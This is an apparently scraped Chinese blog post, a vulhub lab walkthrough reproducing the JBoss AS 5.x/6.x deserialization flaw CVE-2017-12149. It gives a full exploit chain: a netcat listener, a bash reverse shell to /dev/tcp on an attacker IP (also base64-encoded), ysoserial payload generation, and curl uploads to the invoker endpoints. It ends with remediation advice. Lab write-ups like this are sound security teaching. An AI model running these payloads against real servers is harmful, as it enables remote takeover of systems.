{"blogid": "126632995", "writerAge": "ç é¾„2å¹´", "writerBlogNum": "173", "writerCollect": "3220", "writerComment": "2317", "writerFan": "18614", "writerGrade": "6çº§", "writerIntegral": "7075", "writerName": "_PowerShell", "writerProfileAdress": "writer_image\\profile_126632995.jpg", "writerRankTotal": "1894", "writerRankWeekly": "57", "writerThumb": "2045", "writerVisitNum": "365008", "blog_read_count": "417", "blog_time": "äºÂ 2022-08-31 22:08:20Â å‘å¸ƒ", "blog_title": "[ vulhubæ¼æ´å¤ç°ç¯‡ ] JBOSS AS 5.x/6.xååºåˆ—åŒ–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´CVE-2017-12149", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<h1><a id=\"__0\"></a>ğŸ¬ åšä¸»ä»‹ç»</h1>\n<p>ğŸ‘¨â€ğŸ“ åšä¸»ä»‹ç»ï¼šå¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ <a href=\"https://blog.csdn.net/qq_51577576\">_PowerShell</a> ï¼Œå¾ˆé«˜å…´è®¤è¯†å¤§å®¶~<br/> âœ¨ä¸»æ”»é¢†åŸŸï¼šã€æ¸—é€é¢†åŸŸã€‘ã€æ•°æ®é€šä¿¡ã€‘ ã€é€šè®¯å®‰å…¨ã€‘ ã€webå®‰å…¨ã€‘ã€é¢è¯•åˆ†æã€‘<br/> ğŸ‰ç‚¹èµâ•è¯„è®ºâ•æ”¶è— == å…»æˆä¹ æƒ¯ï¼ˆä¸€é”®ä¸‰è¿ï¼‰ğŸ˜‹<br/> ğŸ‰æ¬¢è¿å…³æ³¨ğŸ’—ä¸€èµ·å­¦ä¹ ğŸ‘ä¸€èµ·è®¨è®ºâ­ï¸ä¸€èµ·è¿›æ­¥ğŸ“æ–‡æœ«æœ‰å½©è›‹<br/> ğŸ™ä½œè€…æ°´å¹³æœ‰é™ï¼Œæ¬¢è¿å„ä½å¤§ä½¬æŒ‡ç‚¹ï¼Œç›¸äº’å­¦ä¹ è¿›æ­¥ï¼</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>æ–‡ç« ç›®å½•</h3>\n<ul><li><a href=\"#__0\">ğŸ¬ åšä¸»ä»‹ç»</a></li><li><a href=\"#_8\">ä¸€ã€æ¼æ´ç¼–å·</a></li><li><a href=\"#_12\">äºŒã€å½±å“èŒƒå›´</a></li><li><a href=\"#JBossAS_17\">ä¸‰ã€JBoss-ASæŒ‡çº¹ä¿¡æ¯</a></li><li><a href=\"#_31\">å››ã€æ¼æ´æè¿°</a></li><li><a href=\"#_33\">äº”ã€ç¯å¢ƒæ­å»º</a></li><li><ul><li><a href=\"#1_CVE201712149_34\">1. è¿›å…¥CVE-2017-12149ç¯å¢ƒ</a></li><li><a href=\"#2_CVE201712149_40\">2. å¯åŠ¨CVE-2017-12149ç¯å¢ƒ</a></li><li><a href=\"#3_CVE201712149_47\">3. æŸ¥çœ‹CVE-2017-12149ç¯å¢ƒ</a></li><li><a href=\"#4_CVE201712149_54\">4. è®¿é—®CVE-2017-12149ç¯å¢ƒ</a></li><li><a href=\"#5_CVE201712149_61\">5. æŸ¥çœ‹CVE-2017-12149æç¤ºä¿¡æ¯</a></li><li><a href=\"#6_CVE201712149_67\">6. å…³é—­CVE-2017-12149ç¯å¢ƒ</a></li></ul>\n</li><li><a href=\"#_76\">å…­ã€æ¼æ´å¤ç°</a></li><li><ul><li><a href=\"#1__77\">1. ç¯å¢ƒ</a></li><li><a href=\"#2_Getshell_1_81\">2. Getshell 1</a></li><li><ul><li><a href=\"#_83\">æ”»å‡»æœºç›‘å¬</a></li><li><a href=\"#_89\">é¶æœºè¿æ¥</a></li><li><ul><li><a href=\"#_94\">è¿›è¡Œç¼–ç </a></li><li><a href=\"#ser_99\">æ„å»º.seræ–‡ä»¶</a></li><li><a href=\"#ser_114\">ä¸Šä¼ ç”Ÿæˆçš„seræ–‡ä»¶</a></li></ul>\n</li><li><a href=\"#Getshell_122\">GetshellæˆåŠŸ</a></li></ul>\n</li><li><a href=\"#3_Getshell_2_127\">3. Getshell 2</a></li><li><ul><li><a href=\"#_129\">æ”»å‡»æœºç›‘å¬</a></li><li><a href=\"#_135\">é¶æœºè¿æ¥</a></li><li><a href=\"#Getshell_143\">GetshellæˆåŠŸ</a></li></ul>\n</li><li><a href=\"#4__146\">4. ä¸€é”®åˆ©ç”¨</a></li><li><ul><li><a href=\"#_151\">æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</a></li><li><a href=\"#_159\">æ‰§è¡Œä»»æ„å‘½ä»¤</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_167\">ä¸ƒã€æ¼æ´ä¿®å¤</a></li><li><a href=\"#_170\">å…«ã€ç›¸å…³èµ„æº</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_8\"></a>ä¸€ã€æ¼æ´ç¼–å·</h1>\n<pre><code class=\"prism language-bash\">CVE-2017-12149\n</code></pre>\n<h1><a id=\"_12\"></a>äºŒã€å½±å“èŒƒå›´</h1>\n<pre><code class=\"prism language-bash\">Jboss AS <span class=\"token number\">5</span>.x\nJbossAS <span class=\"token number\">6</span>.x\n</code></pre>\n<h1><a id=\"JBossAS_17\"></a>ä¸‰ã€JBoss-ASæŒ‡çº¹ä¿¡æ¯</h1>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"manage this jboss as instance\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"title_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"welcome to jboss as\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"header_contains\"</span>,\n<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"jbossas\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"jbossas\"</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<h1><a id=\"_31\"></a>å››ã€æ¼æ´æè¿°</h1>\n<blockquote>\n<p>è¯¥æ¼æ´ä¸º Javaååºåˆ—åŒ–é”™è¯¯ç±»å‹ï¼Œå­˜åœ¨äº Jboss çš„ HttpInvoker ç»„ä»¶ä¸­çš„ ReadOnlyAccessFilter è¿‡æ»¤å™¨ä¸­ã€‚è¯¥è¿‡æ»¤å™¨åœ¨æ²¡æœ‰è¿›è¡Œä»»ä½•å®‰å…¨æ£€æŸ¥çš„æƒ…å†µä¸‹å°è¯•å°†æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®æµè¿›è¡Œååºåˆ—åŒ–ï¼Œä»è€Œå¯¼è‡´äº†æ¼æ´ã€‚</p>\n</blockquote>\n<h1><a id=\"_33\"></a>äº”ã€ç¯å¢ƒæ­å»º</h1>\n<h2><a id=\"1_CVE201712149_34\"></a>1. è¿›å…¥CVE-2017-12149ç¯å¢ƒ</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">cd</span> vulhub/jboss/CVE-2017-12149\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\11849594ca7441e78b237ad107fa5d51.png\"/></p>\n<h2><a id=\"2_CVE201712149_40\"></a>2. å¯åŠ¨CVE-2017-12149ç¯å¢ƒ</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> up -d\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\85c7148ebf784c64a56f45ef505a3a2e.png\"/></p>\n<h2><a id=\"3_CVE201712149_47\"></a>3. æŸ¥çœ‹CVE-2017-12149ç¯å¢ƒ</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> <span class=\"token function\">ps</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\060eed74803a4a1a9e2ca77352e36966.png\"/></p>\n<h2><a id=\"4_CVE201712149_54\"></a>4. è®¿é—®CVE-2017-12149ç¯å¢ƒ</h2>\n<pre><code class=\"prism language-bash\">http://you-ip:8080\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\d247603649eb4262a98e4f4aa04e6dc8.png\"/></p>\n<h2><a id=\"5_CVE201712149_61\"></a>5. æŸ¥çœ‹CVE-2017-12149æç¤ºä¿¡æ¯</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">cat</span> README.md\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\358499526361436297c74d96e3f13e05.png\"/></p>\n<h2><a id=\"6_CVE201712149_67\"></a>6. å…³é—­CVE-2017-12149ç¯å¢ƒ</h2>\n<blockquote>\n<p>ä½¿ç”¨å®Œæˆè®°å¾—å…³é—­ç¯å¢ƒ</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> down\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\848a871b50e0479e8a8e9e536d618d4c.png\"/></p>\n<h1><a id=\"_76\"></a>å…­ã€æ¼æ´å¤ç°</h1>\n<h2><a id=\"1__77\"></a>1. ç¯å¢ƒ</h2>\n<blockquote>\n<p>é¶æœºï¼škaliï¼š192.168.13.131<br/> æ”»å‡»æœºï¼šwindowsï¼š192.168.192.1</p>\n</blockquote>\n<h2><a id=\"2_Getshell_1_81\"></a>2. Getshell 1</h2>\n<blockquote>\n<p>åªéœ€è¦æ„é€ å¸¦æœ‰éœ€è¦æ‰§è¡ŒPayloadçš„seræ–‡ä»¶ï¼Œç„¶åä½¿ç”¨curlå°†äºŒè¿›åˆ¶æ–‡ä»¶æäº¤è‡³ç›®æ ‡æœåŠ¡å™¨çš„invoker/JMXInvokerServleté¡µé¢ä¸­ï¼Œå³å¯æ‰§è¡ŒPayloadä¸­æŒ‡å®šçš„å‘½ä»¤ï¼Œè·å–å¯¹ç”µè„‘çš„æ§åˆ¶æƒ</p>\n</blockquote>\n<h3><a id=\"_83\"></a>æ”»å‡»æœºç›‘å¬</h3>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>nc.exe -lvvp <span class=\"token number\">55555</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\7a29164bc25f4ea391f50d6d7a262ee3.png\"/></p>\n<h3><a id=\"_89\"></a>é¶æœºè¿æ¥</h3>\n<blockquote>\n<p>è¿æ¥å‘½ä»¤</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">bash</span> -i <span class=\"token operator\">&gt;&amp;</span>/dev/tcp/192.168.192.1/55555 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span>\n</code></pre>\n<h4><a id=\"_94\"></a>è¿›è¡Œç¼–ç </h4>\n<pre><code class=\"prism language-bash\">https://www.loadcaps.com/runtime-exec-payloads/<span class=\"token comment\">#java-lang-Runtime-exec</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\81fedb3f42d44017b3a34cb752cb793b.png\"/></p>\n<h4><a id=\"ser_99\"></a>æ„å»º.seræ–‡ä»¶</h4>\n<blockquote>\n<p>åˆ©ç”¨ysoserial-all.jarå·¥å…·æ„å»º.seræ–‡ä»¶<br/> ysoserial-all.jarå·¥å…·ä¸‹è½½åœ°å€ï¼š</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">https://github.com/frohoff/ysoserial\n</code></pre>\n<blockquote>\n<p>åˆ©ç”¨ysoserial.jaråŒ…çš„CommonsCollections5é“¾æŠŠè¦æ‰§è¡Œçš„åå¼¹shellç”Ÿæˆä¸€ä¸ªseræ–‡ä»¶</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">java -jar /root/Desktop/ysoserial-all.jar CommonsCollections5 <span class=\"token string\">\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTkyLjEvNTU1NTUgMD4mMQ==}|{base64,-d}|{bash,-i}\"</span><span class=\"token operator\">&gt;</span>poc.ser\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\79854059b5c1449788a631bd1754e2ce.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\240a4bd2d5e54b839ed92df097aaf68f.png\"/></p>\n<h4><a id=\"ser_114\"></a>ä¸Šä¼ ç”Ÿæˆçš„seræ–‡ä»¶</h4>\n<blockquote>\n<p>ä½¿ç”¨curlå‘½ä»¤ä¸Šä¼ ç”Ÿæˆçš„seræ–‡ä»¶<br/> curlå¯¹invoker/JMXInvokerServletç›®å½•ä½¿ç”¨postè¯·æ±‚ä¸Šä¼ ç”Ÿæˆçš„ser</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">curl</span> http://192.168.13.131:8080/invoker/JMXInvokerServlet --data-binary @poc.ser\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\a157dcc6de69472f8c9dc70d782195a6.png\"/></p>\n<h3><a id=\"Getshell_122\"></a>GetshellæˆåŠŸ</h3>\n<p>æ‰§è¡Œls<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\8e16c8be221f4e89bec80525b2aa0b0f.png\"/></p>\n<h2><a id=\"3_Getshell_2_127\"></a>3. Getshell 2</h2>\n<blockquote>\n<p>åªéœ€è¦æ„é€ å¸¦æœ‰éœ€è¦æ‰§è¡ŒPayloadçš„seræ–‡ä»¶ï¼Œç„¶åä½¿ç”¨curlå°†äºŒè¿›åˆ¶æ–‡ä»¶æäº¤è‡³ç›®æ ‡æœåŠ¡å™¨çš„invoker/readonlyé¡µé¢ä¸­ï¼Œå³å¯æ‰§è¡ŒPayloadä¸­æŒ‡å®šçš„å‘½ä»¤ï¼Œè·å–å¯¹ç”µè„‘çš„æ§åˆ¶æƒ</p>\n</blockquote>\n<h3><a id=\"_129\"></a>æ”»å‡»æœºç›‘å¬</h3>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>nc.exe -lvvp <span class=\"token number\">55555</span>\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\fea0575b44ca40bfadfe4071c18e2171.png\"/></p>\n<h3><a id=\"_135\"></a>é¶æœºè¿æ¥</h3>\n<blockquote>\n<p>curlå¯¹/invoker/readonlyç›®å½•ä½¿ç”¨postè¯·æ±‚ä¸Šä¼ ç”Ÿæˆçš„ser<br/> ä¸çŸ¥é“poc.seræ€ä¹ˆæ¥çš„å¯ä»¥çœ‹ä¸Šé¢çš„getshell 1</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">curl</span> http://192.168.13.131:8080/invoker/readonly --data-binary @poc.ser\n</code></pre>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\10161d85a27c440bb281fe435bb28868.png\"/></p>\n<h3><a id=\"Getshell_143\"></a>GetshellæˆåŠŸ</h3>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\11f527e5dace47d6bda8f811c72b252c.png\"/></p>\n<h2><a id=\"4__146\"></a>4. ä¸€é”®åˆ©ç”¨</h2>\n<blockquote>\n<p>jboss-_CVE-2017-12149å·¥å…·ä¸‹è½½åœ°å€ :</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">https://github.com/yunxu1/jboss-_CVE-2017-12149\n</code></pre>\n<h3><a id=\"_151\"></a>æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨</h3>\n<blockquote>\n<p>ç›´æ¥è¾“å…¥ç›®æ ‡è¿›è¡Œæ£€æµ‹</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080\n</code></pre>\n<blockquote>\n<p>æç¤ºå­˜åœ¨æ¼æ´ï¼Œç³»ç»Ÿæ˜¯linuxçš„<br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\4a46693fea82448cb434293cb477b570.png\"/></p>\n</blockquote>\n<h3><a id=\"_159\"></a>æ‰§è¡Œä»»æ„å‘½ä»¤</h3>\n<blockquote>\n<p>è¾“å…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤è¿›è¡Œå®ç°</p>\n</blockquote>\n<p><img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\968c708a73a7453289f5865b9aaf449f.png\"/><br/> <img alt=\"åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°\" src=\"image\\b430b2e8042f4e52859ea1f6e5be8670.png\"/></p>\n<h1><a id=\"_167\"></a>ä¸ƒã€æ¼æ´ä¿®å¤</h1>\n<blockquote>\n<p>1ã€ä¸éœ€è¦ http-invoker.sar ç»„ä»¶çš„ç”¨æˆ·å¯ç›´æ¥åˆ é™¤æ­¤ç»„ä»¶ã€‚<br/> 2ã€æ·»åŠ å¦‚ä¸‹ä»£ç è‡³ http-invoker.sar ä¸‹ web.xml çš„ security-constraint æ ‡ç­¾ä¸­ï¼Œå¯¹ http invoker ç»„ä»¶è¿›è¡Œè®¿é—®æ§åˆ¶ï¼š/*</p>\n</blockquote>\n<h1><a id=\"_170\"></a>å…«ã€ç›¸å…³èµ„æº</h1>\n<p>docker æ­å»º vulhub é¶åœºç¯å¢ƒï¼š</p>\n<pre><code class=\"prism language-bash\">https://blog.csdn.net/qq_51577576/article/details/125048165\n</code></pre>\n<p>åå¼¹shellçš„é›†ä¸­å¸¸è§æ–¹å¼ï¼ˆä¸€ï¼‰ncåå¼¹shell</p>\n<pre><code class=\"prism language-bash\">https://blog.csdn.net/qq_51577576/article/details/126128251\n</code></pre>\n<p>execç¼–ç å·¥å…·ï¼š</p>\n<pre><code class=\"prism language-bash\">https://www.loadcaps.com/runtime-exec-payloads/<span class=\"token comment\">#java-lang-Runtime-exec</span>\n</code></pre>\n<p>jboss-_CVE-2017-12149ä¸€é”®åˆ©ç”¨å·¥å…·ï¼š</p>\n<pre><code class=\"prism language-bash\">https://github.com/yunxu1/jboss-_CVE-2017-12149\n</code></pre>\n<p>ysoserial-all.jarå·¥å…·ï¼š</p>\n<pre><code class=\"prism language-bash\">https://github.com/frohoff/ysoserial\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}